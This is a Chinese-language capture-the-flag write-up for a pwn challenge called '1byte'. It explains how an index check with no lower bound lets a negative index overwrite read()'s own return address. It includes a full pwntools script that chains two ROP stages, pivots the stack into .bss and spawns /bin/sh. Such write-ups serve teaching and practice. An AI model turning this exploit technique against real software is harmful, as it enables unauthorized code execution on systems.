# 1byte

## 题目简述

程序在栈上分配一个 `0x50` 字节缓冲区，先读取有符号下标 `idx` 和长度 `len`，再执行：

```c
if (idx > 0x50)
    lose();

size_t maxlen = 0x69 - idx;
read(0, &buf[idx], len > maxlen ? maxlen : len);
```

目标是利用下标检查缺少下界这一点完成 ROP。目标为 amd64 ELF，保护为 Partial RELRO、无栈 canary、NX 开启、无 PIE。二进制还显式提供了 `pop rdi/rsi/rdx/rax; ret` 与 `syscall` 指令，因此主要障碍不是寻找 gadget，而是理解负索引写入与正在执行的 `read` 栈帧之间的关系。

## 解题过程

### 区分“一字节覆盖”和最终利用原语

静态反汇编中，`main` 的栈帧大小是 `0x60`：

```text
rbp-0x60  buf 起点
rbp-0x10  buf+0x50
rbp-0x08  maxlen
rbp+0x00  saved RBP
rbp+0x08  saved RIP
```

当 `idx=0x50` 时，最大输入长度为 `0x69-0x50=0x19`。写入从 `rbp-0x10` 开始，最后一个字节刚好覆盖 `main` saved RIP 的最低字节，这就是题名中的“1byte”。但只改返回地址低字节不足以容纳完整利用链。

真正有用的是负索引。`idx` 来自返回有符号 `long` 的 `strtol`，而检查只有 `idx > 0x50`，所以 `-8` 可以通过。最终一次 `read` 被调用时，其返回地址位于 `main` 当前栈顶，也就是 `buf-8`；令 `idx=-8` 后，内核会从这个返回地址开始写入。这样，输入的首个八字节直接成为 `read` 返回后的 RIP，后续内容则自然落入 `buf`，形成连续 ROP 栈。

此时：

$$
\text{maxlen}=0x69-(-8)=0x71
$$

`0x71` 字节足以放下一个 80 字节的第一阶段：调用 `read(0, bss, 0x100)`，再控制 `rbp` 并通过 `leave; ret` 把栈迁移到 `.bss`。第二阶段在 `.bss` 中放置 `/bin/sh\0`，设置 `rax=59`、`rdi` 指向该字符串、`rsi=rdx=0`，最后执行 `syscall`。

### 完整利用脚本

下面脚本用 pwntools 自动寻找大部分 gadget，只保留服务地址为运行时参数。`.bss+0x800` 位于该非 PIE 映像的可写映射页内，本地验证所用地址为 `0x404860`。

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF("./pwn", checksec=False)
rop = ROP(elf)

pop_rdi = rop.find_gadget(["pop rdi", "ret"]).address
pop_rsi = rop.find_gadget(["pop rsi", "ret"]).address
pop_rdx = rop.find_gadget(["pop rdx", "ret"]).address
pop_rax = rop.find_gadget(["pop rax", "ret"]).address
pop_rbp = rop.find_gadget(["pop rbp", "ret"]).address
leave_ret = rop.find_gadget(["leave", "ret"]).address
syscall = next(elf.search(asm("syscall")))

bss = elf.bss() + 0x800

if args.REMOTE:
    io = remote(args.HOST, int(args.PORT))
else:
    io = process(elf.path)

io.sendlineafter(b"> ", b"-8")
io.sendlineafter(b"> ", b"113")  # 0x71

stage1 = flat(
    pop_rdi, 0,
    pop_rsi, bss,
    pop_rdx, 0x100,
    elf.plt["read"],
    pop_rbp, bss,
    leave_ret,
)
assert len(stage1) == 80
io.sendafter(b"> ", stage1.ljust(0x71, b"\x00"))

# leave; ret 会先从 bss 弹出新的 rbp，再从 bss+8 开始执行 ROP。
binsh = bss + 0x50
stage2 = flat(
    0,
    pop_rdi, binsh,
    pop_rsi, 0,
    pop_rdx, 0,
    pop_rax, 59,
    syscall,
    b"/bin/sh\x00",
)
assert len(stage2) == 88
io.send(stage2.ljust(0x100, b"\x00"))
io.interactive()
```

本地二进制解析出的关键地址为：`read@plt=0x4010e4`、`pop rbp; ret=0x4011dd`、`syscall=0x401304`、`leave; ret=0x4012cf`，四个显式 `pop` gadget 位于 `0x401314` 至 `0x40131a`。实际执行脚本后，第二阶段成功启动 `/bin/sh`，并能执行回显命令，说明负索引覆盖、二次读取、栈迁移和 `execve` 四个环节均已验证。

## 方法总结

- 核心技巧：利用缺少下界的有符号索引，把 `read` 的目标缓冲区指向该调用自身的返回地址，再用两阶段 ROP 解决首阶段长度不足。
- 识别信号：看到 `&buf[idx]`、只检查索引上界，以及二进制主动提供 `pop`/`syscall` gadget 时，应同时检查调用者 saved RIP 和被调用函数当前返回现场，不能只画静态的 `main` 栈帧。
- 复用要点：先精确计算负索引、可写长度和首阶段字节数；空间不足时，用一次受控 `read` 将大链写到 `.bss`，再通过 `leave; ret` 迁移。
